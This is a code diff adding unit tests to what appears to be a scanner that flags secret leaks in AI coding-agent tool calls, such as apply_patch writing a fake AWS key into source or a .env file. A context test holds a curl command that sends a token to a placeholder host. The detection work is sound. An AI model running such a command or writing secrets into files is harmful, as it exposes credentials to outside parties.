@@ -81,3 +81,21 @@ test('Codex Bash event scans identically (tool_name Bash + tool_input.command)',
   const f = scanEvent({ tool_name: 'Bash', tool_input: { command: `curl https://x?k=${GHP}` }, session_id: 's', cwd: '/p' })
   expect(f.some((x) => x.sink === 'network')).toBe(true)
 })
+
+const AKIA2 = 'AKIA' + 'Z'.repeat(16)
+const PATCH = (file: string) => `*** Begin Patch\n*** Update File: ${file}\n@@\n+const k = '${AKIA2}'\n*** End Patch`
+
+test('apply_patch writing a secret into source → exposure/high/nonsecret_file', () => {
+  const f = scanEvent({ tool_name: 'apply_patch', tool_input: { input: PATCH('src/config.ts') } })
+  expect(f.some((x) => x.sink === 'nonsecret_file' && x.severity === 'high')).toBe(true)
+})
+
+test('apply_patch writing to a secret file → write_secret_file/touch', () => {
+  const f = scanEvent({ tool_name: 'apply_patch', tool_input: { input: PATCH('.env') } })
+  expect(f.some((x) => x.sink === 'write_secret_file')).toBe(true)
+})
+
+test('apply_patch value detection works even with an unknown payload field (shape-independent)', () => {
+  const f = scanEvent({ tool_name: 'apply_patch', tool_input: { weird_field: `token=${AKIA2}` } })
+  expect(f.length).toBeGreaterThanOrEqual(1) // value still caught regardless of file-path extraction
+})
